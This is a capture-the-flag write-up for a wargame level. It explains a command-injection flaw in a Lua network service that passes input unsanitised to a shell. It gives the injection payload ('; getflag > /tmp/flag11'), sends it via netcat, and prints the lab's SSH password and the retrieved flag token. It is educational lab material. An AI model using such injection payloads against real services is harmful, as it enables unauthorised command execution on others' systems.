# Level11

## How to Login

To access the system, use the following SSH command:

```bash
ssh level11@<IP_ADDRESS> -p 4242
password: feulo4b72j7edeahuete3no7c
```

## How to Get the Flag

Upon logging in, you'll find a Lua script named `level11.lua`. This script implements a simple network service that performs a password check.

### Analyzing the Script

`ls` shows only the `level11.lua` file. Running the script directly results in an "address already in use" error:

```
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

This indicates that the script is already running as a background process.  `cat level11.lua` reveals the script's contents:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

Key observations:

*   **Network Service:** The script uses the `socket` library to bind to `127.0.0.1` (localhost) on port `5151`.  This confirms it's a network service.
*   **`hash` Function:** This function takes a password as input, pipes it to the `echo` command, and then pipes the output to `sha1sum`.  It extracts the first 40 characters of the SHA1 hash.  This is the vulnerability.
*   **Command Injection:** The `hash` function uses `io.popen` to execute a shell command.  Crucially, the input `pass` is concatenated directly into the command string without any sanitization. This creates a command injection vulnerability.
* **Verification**: You can verify with `nc -zv 127.0.0.1 5151` that the port is open.

### Exploiting the Vulnerability

We can inject arbitrary commands into the `echo` command within the `hash` function. We'll use a semicolon (`;`) to terminate the intended `echo` command and then add our own command.

1.  **Craft the Payload:**  We want to execute `getflag` and redirect its output to a file in `/tmp` (since we likely don't have write access to the current directory).  The payload will be:

    ```
    ; getflag > /tmp/flag11
    ```

    The leading semicolon terminates the `echo` command. `getflag` is executed, and its output is redirected to `/tmp/flag11`.

2.  **Send the Payload:** Use `netcat` (`nc`) to connect to the service and send the payload.  We'll pipe the payload to `nc`:

    ```bash
    echo "; getflag > /tmp/flag11" | nc 127.0.0.1 5151
    ```

    *   `echo "; getflag > /tmp/flag11"`:  This creates the payload string.
    *   `|`:  This pipes the output of `echo` to the input of `nc`.
    *   `nc 127.0.0.1 5151`: This connects to the vulnerable service running on localhost, port 5151.

3.  **Retrieve the Flag:**  The `getflag` command's output will now be in `/tmp/flag11`.  Read it:

    ```bash
    cat /tmp/flag11
    ```

    This will output:

    ```
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
    ```

```


